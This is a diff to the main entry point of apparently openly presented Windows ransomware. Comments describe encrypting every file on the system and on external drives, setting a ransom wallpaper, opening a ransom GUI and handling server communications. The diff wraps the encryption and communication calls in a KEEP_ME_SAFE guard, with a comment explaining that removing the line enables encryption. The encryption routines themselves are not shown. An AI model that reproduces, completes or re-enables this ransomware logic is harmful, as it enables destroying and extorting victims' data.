@@ -6,8 +6,11 @@
 #include "ServiceWorker.hpp"
 #include "..\..\include\include.hpp"
 
+// Remove this line to enable encryption
+#define KEEP_ME_SAFE
 
-int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow) 
+
+int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
 {
 	dbg::initLogs();
 
@@ -26,12 +29,14 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 	// Initialize encryption keys and setup user data resources
 	worker.init();
 
+#ifndef KEEP_ME_SAFE
 	// Encrypting all files on the system and external drives
 	const auto drives = worker.getDrives();
 	worker.encryptAllFiles(drives);
 
 	// Set wallpaper
 	worker.setWallpaper();
+#endif
 
 	// Open ransom GUI after encryption
 	worker.openGUI();
@@ -43,8 +48,10 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 		utils::stopAndExit(EXIT_FAILURE);
 	}
 
+#ifndef KEEP_ME_SAFE
 	// Handle messages from GUI
 	worker.handleServerComs(std::move(comsServer));
+#endif
 
 	utils::stopAndExit(EXIT_SUCCESS);
 }
